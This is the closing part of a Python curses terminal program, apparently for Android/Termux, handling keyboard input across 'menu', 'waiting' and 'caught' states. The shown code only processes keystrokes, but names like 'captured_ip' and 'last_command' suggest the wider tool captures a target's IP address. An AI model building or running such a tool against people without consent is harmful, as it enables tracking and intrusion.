            elif ch in (10, 13):
                if user_input == "0":
                    state = "menu"
                    user_input = ""
                else:
                    user_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                user_input = user_input[:-1]
            elif 32 <= ch <= 126:
                user_input += chr(ch)
        
        elif state == "waiting":
            if captured_ip is not None:
                state = "caught"
                waiting_input = ""
                continue
            
            if ch == -1:
                pass
            elif ch in (10, 13):
                if waiting_input == "0":
                    wake_lock_off()
                    state = "menu"
                    waiting_input = ""
                    user_input = ""
                    continue
                elif waiting_input != "":
                    last_command = waiting_input
                    waiting_input = ""
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                waiting_input = waiting_input[:-1]
            elif 32 <= ch <= 126:
                waiting_input += chr(ch)
        
        elif state == "caught":
            if ch == -1:
                pass
            elif ch in (10, 13):
                if waiting_input == "0":
                    wake_lock_off()
                    state = "menu"
                    waiting_input = ""
                    user_input = ""
                    continue
            elif ch in (curses.KEY_BACKSPACE, 127, 8):
                waiting_input = waiting_input[:-1]
            elif 32 <= ch <= 126:
                waiting_input += chr(ch)

# ============ ЗАПУСК ============

if __name__ == "__main__":
    check_and_install()
    curses.wrapper(main)
